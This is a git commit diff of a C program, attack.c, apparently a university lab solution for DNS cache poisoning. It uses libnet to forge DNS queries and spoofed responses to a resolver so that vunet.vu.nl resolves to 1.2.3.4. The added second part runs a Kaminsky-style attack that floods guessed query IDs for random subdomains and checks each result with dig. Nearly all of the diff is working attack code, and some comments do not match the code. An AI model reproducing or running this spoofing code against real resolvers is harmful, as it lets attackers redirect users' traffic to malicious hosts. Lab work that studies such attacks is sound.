21524968e1f527d4e8aa78b71ddd3418566ae865
YounesBoubbou <102986644+YounesBoubbou@users.noreply.github.com>
2023-12-12 16:52:03 +0100

    Add files via upload
    Added part 2

--- attack.c
+++ attack.c
@@ -3,11 +3,13 @@
 #include <stdio.h>
 #include <stdint.h>
 #include <string.h>
+#include <time.h>
+#include <unistd.h>
 #include <arpa/inet.h> // For htons, htonl
 #include <netinet/in.h> // For inet_pton
 #include <libnet/libnet-functions.h>
 
-#define DNS_QUERY_NAME "\005vunet\002vu\002nl\000" // Domain to be spoofed
+#define DNS_QUERY_NAME "vunet.vu.nl" // Domain to be spoofed
 #define SPOOFED_IP "1.2.3.4"          // Spoofed IP address for the domain
 #define RESOLVER_IP "192.168.10.10"  // IP address of the resolver
 
@@ -31,6 +33,40 @@ struct dns_answer {
     char rdata[4]; // IPv4 address is 4 bytes
 } __attribute__((packed));
 
+
+// Function to initialize the random number generator
+void init_random() {
+    srand((unsigned)time(NULL));
+}
+
+char random_char() {
+    static const char alphanum[] =
+        "abcdefghijklmnopqrstuvwxyz";
+
+    int index = rand() % (sizeof(alphanum) - 1); // -1 to exclude null terminator
+    return alphanum[index];
+}
+
+
+//Function 
+void generate_random_string(char *str, size_t size) {
+    if (size < 10) { // Minimum length required for "#####.vu.nl"
+        return;
+    }
+
+    for (size_t i = 0; i < 5; ++i) {
+        str[i] = random_char();
+    }
+
+    strcpy(&str[5], ".vu.nl");
+}
+
+// Function to generate a random uint16_t between two uint16_t values
+uint16_t random_uint16_between(uint16_t a, uint16_t b) {
+    uint16_t min = a < b ? a : b; // Determine the smaller value
+    uint16_t max = a > b ? a : b; // Determine the larger value
+    return min + (rand() % (max - min + 1));
+}
 
 // Utility function to print domain name in DNS format
 void print_dns_name(const unsigned char *dns_name) {
@@ -70,18 +106,6 @@ void print_dns_answer(const struct dns_answer *response) {
     printf("RDLength: %u\n", ntohs(response->rdlength));
     inet_ntop(AF_INET, response->rdata, ip_str, INET_ADDRSTRLEN);
     printf("RData (IP Address): %s\n\n", ip_str);
-
-// Function to print the contents of the dns_question struct
-void print_dns_question(const struct dns_question *query) {
-    printf("DNS Query Structure:\n");
-    printf("Domain: ");
-    print_dns_name((const unsigned char *)query->domain);
-    printf("\n");
-    printf("QType: %u\n", ntohs(query->qtype));
-    printf("QClass: %u\n\n", ntohs(query->qclass));
-}
-
-// Function to print the contents of the dns_answer struct
 }
 
 
@@ -105,12 +129,12 @@ void domain_to_dns_format(unsigned char* dns, const char* domain) {
 }
 
 // Function to send DNS query
-void send_dns_query(libnet_t *l, uint16_t query_id, uint16_t resolver_port) {
-    //unsigned char dns_format_domain[256];
-    //domain_to_dns_format(dns_format_domain, DNS_QUERY_NAME);
+void send_dns_query(libnet_t *l, uint16_t query_id, uint16_t resolver_port, char* domain_name) {
+    unsigned char dns_format_domain[256];
+    domain_to_dns_format(dns_format_domain, domain_name);
     // DNS header structure
     struct dns_question query;
-    strcpy(query.domain, DNS_QUERY_NAME);
+    strcpy(query.domain, dns_format_domain);
     query.qtype = htons(1);  // Type A (Host address)
     query.qclass = htons(1); // Class IN
     //print_dns_question(&query);
@@ -177,15 +201,17 @@ void send_dns_query(libnet_t *l, uint16_t query_id, uint16_t resolver_port) {
         printf("\n");
         
     }
+    //Clear the packet
+    libnet_clear_packet(l);
 }
 
-void send_dns_response(libnet_t *l, uint16_t query_id, uint16_t resolver_port) {
+void send_dns_response(libnet_t *l, uint16_t query_id, uint16_t resolver_port, char* domain_name) {
  
     unsigned char dns_format_domain[256];
-    domain_to_dns_format(dns_format_domain, DNS_QUERY_NAME);
+    domain_to_dns_format(dns_format_domain, domain_name);
     struct dns_answer response;
-    strcpy(response.domain, DNS_QUERY_NAME);
-    strcpy(response.answer, DNS_QUERY_NAME);
+    strcpy(response.domain, dns_format_domain);
+    strcpy(response.answer, dns_format_domain);
     response.qtype = htons(1);      // A record
     response.qclass = htons(1);     // IN class
     response.type = htons(1);       // A record
@@ -233,7 +259,7 @@ void send_dns_response(libnet_t *l, uint16_t query_id, uint16_t resolver_port) {
     
 
     if( libnet_build_ipv4(
-        LIBNET_IPV4_H + LIBNET_UDP_H + LIBNET_UDP_DNSV4_H + sizeof(struct dns_answer),  // Total packet lengt#include <netinet/in.h> // For inet_ptonh
+        LIBNET_IPV4_H + LIBNET_UDP_H + LIBNET_UDP_DNSV4_H + sizeof(struct dns_answer),  // Total packet length
         0,                                            // TOS
         libnet_get_prand(LIBNET_PRu16),               // IP ID
         0,                                            // Fragmentation
@@ -257,6 +283,9 @@ void send_dns_response(libnet_t *l, uint16_t query_id, uint16_t resolver_port) {
     } else {
         printf("\n");
     }
+    //clear the packet
+    libnet_clear_packet(l);
+
 
 }
 
@@ -265,64 +294,129 @@ int main(int argc, char *argv[]) {
     FILE *fp;
     char output[1035];
     const char* target_ip = "1.2.3.4";
-    int max_retries = 5; // You can set this to the number of retries you want
+    int max_retries = 10; // You can set this to the number of retries you want
     int retry_count = 0;
     int found = 0;
 
-    if (argc != 5 || strcmp(argv[1], "-p") != 0 || atoi(argv[2]) != 1) {
-        fprintf(stderr, "Usage: %s -p 1 <resolver-port> <query-ID>\n", argv[0]);
-        return 1;
-    }
-
-    uint16_t resolver_port = (uint16_t)atoi(argv[3]);
-    uint16_t query_id = (uint16_t)atoi(argv[4]);
-
-    char errbuf[LIBNET_ERRBUF_SIZE];
-    libnet_t *l = libnet_init(LIBNET_RAW4, NULL, errbuf);
-    if (l == NULL) {
-        fprintf(stderr, "libnet_init() failed: %s\n", errbuf);
-        return 2;
-    }
-    send_dns_query(l, query_id, resolver_port);
-    send_dns_response(l, query_id, resolver_port);
-    //Set up a loop to keep re trying until the target IP is found or the max number of retries is reached
-      while (retry_count < max_retries && !found) {
-        fp = popen("dig @192.168.10.10 vunet.vu.nl +short", "r");
-        if (fp == NULL) {
-            printf("Failed to run command\n");
-            exit(1);
+    if(argc == 5 && strcmp(argv[1], "-p") == 0 && atoi(argv[2]) == 1){
+        uint16_t resolver_port = (uint16_t)atoi(argv[3]);
+        uint16_t query_id = (uint16_t)atoi(argv[4]);
+        char domain_name[13] = "vunet.vu.nl";
+        char errbuf[LIBNET_ERRBUF_SIZE];
+        libnet_t *l = libnet_init(LIBNET_RAW4, NULL, errbuf);
+        if (l == NULL) {
+            fprintf(stderr, "libnet_init() failed: %s\n", errbuf);
+            return 2;
         }
-        //Get the output from the dig command and check if the target IP is found
-        //If the target IP is found, set found to 1 to break out of the loop
-        while (fgets(output, sizeof(output), fp) != NULL) {
-            if (strstr(output, target_ip) != NULL) {
-                found = 1;
-                break;
+        send_dns_query(l, query_id, resolver_port, domain_name);
+        send_dns_response(l, query_id, resolver_port, domain_name);
+        //Set up a loop to keep re trying until the target IP is found or the max number of retries is reached
+        while (retry_count < max_retries && !found) {
+            fp = popen("dig @192.168.10.10 vunet.vu.nl +short", "r");
+            if (fp == NULL) {
+                printf("Failed to run command\n");
+                exit(1);
+            }
+
+            //Get the output from the dig command and check if the target IP is found
+            //If the target IP is found, set found to 1 to break out of the loop
+            while (fgets(output, sizeof(output), fp) != NULL) {
+                if (strstr(output, target_ip) != NULL) {
+                    found = 1;
+                    break;
+                }
+            }
+
+            pclose(fp);
+
+            //If the target IP is not found, increment the retry count and try again
+            if (!found) {
+                retry_count++;
+                // Sleep for a bit before retrying (e.g., 1 second)
+                send_dns_query(l, query_id, resolver_port, domain_name);
+                send_dns_response(l, query_id, resolver_port, domain_name);
             }
         }
 
-        pclose(fp);
-
-        //If the target IP is not found, increment the retry count and try again
-        if (!found) {
-            retry_count++;
-            // Sleep for a bit before retrying (e.g., 1 second)
-            send_dns_query(l, query_id, resolver_port);
-            send_dns_response(l, query_id, resolver_port);
-        }
-    }
-
-    if (found) {
-        printf("vunet.vu.nl %s\n", target_ip);
-    } else {
-        printf("\n");
+        if (found) {
+            printf("vunet.vu.nl %s\n", target_ip);
+        } else {
+            printf("\n");
         
+        }
+        libnet_destroy(l);
     }
+
+    if(argc == 6 && strcmp (argv[1], "-p") == 0 && atoi(argv[2]) == 2){
+        init_random();
+        uint16_t resolver_port = (uint16_t)atoi(argv[3]);
+        uint16_t beginning_id = (uint16_t)atoi(argv[4]);
+        uint16_t end_id = (uint16_t)atoi(argv[5]);
+        char errbuf[LIBNET_ERRBUF_SIZE];
+        libnet_t *l = libnet_init(LIBNET_RAW4, NULL, errbuf);
+        if (l == NULL) {
+            fprintf(stderr, "libnet_init() failed: %s\n", errbuf);
+            return 2;
+        }
+        //generate a random string of the form #####.vu.nl, where # is a random lowercase letter 
+        char random_domain_name[13];
+        generate_random_string(random_domain_name, sizeof(random_domain_name));
+        //printf("Random domain name: %s\n", random_domain_name);
+        //generate a random query ID between beginning_id and end_id
+        uint16_t random_query_id = random_uint16_between(beginning_id, end_id);
+        //printf("Random query ID: %u\n", random_query_id);
+        
+        //Set up a loop to keep re trying until the target IP is found or the max number of retries is reached
+        while (retry_count < max_retries && !found) {
+            send_dns_query(l, random_query_id, resolver_port, random_domain_name);
+            //sleep for 500 milliseconds
+            usleep(10000);
+            send_dns_response(l, random_query_id, resolver_port, random_domain_name);
+            char command[256];
+            for(int i = 0; i < 10; i++){
+                random_query_id = random_uint16_between(beginning_id, end_id);
+                send_dns_response(l, random_query_id, resolver_port,random_domain_name);
+            }
+            snprintf(command, sizeof(command), "dig @192.168.10.10 %s +short", random_domain_name);
+            FILE *fp = popen(command, "r");
+            if (fp == NULL) {
+                printf("Failed to run command\n");
+                exit(1);
+            }
+
+            //Get the output from the dig command and check if the target IP is found
+            //If the target IP is found, set found to 1 to break out of the loop
+            while (fgets(output, sizeof(output), fp) != NULL) {
+                if (strstr(output, target_ip) != NULL) {
+                    found = 1;
+                    break;
+                }
+            }
+
+            pclose(fp);
+
+            //If the target IP is not found, increment the retry count and try again
+            if (!found) {
+                retry_count++;
+                // Sleep for a bit before retrying (e.g., 1 second)
+                random_query_id = random_uint16_between(beginning_id, end_id);
+                send_dns_query(l, random_query_id, resolver_port, random_domain_name);
+                send_dns_response(l, random_query_id, resolver_port, random_domain_name);
+            }
+                if (found) {
+                printf("%s  %s\n", random_domain_name, output);
+            } else {
+                retry_count = 0;
+                found = 0;
+                generate_random_string(random_domain_name, sizeof(random_domain_name));
+            }
+        }
+
+        
+
+        libnet_destroy(l);
+        
     
-
-    // Introduce a delay if needed (usleep uses microseconds)
-    //usleep(500000); // 500 milliseconds delay
-
-    libnet_destroy(l);
     return 0;
+    }
 }
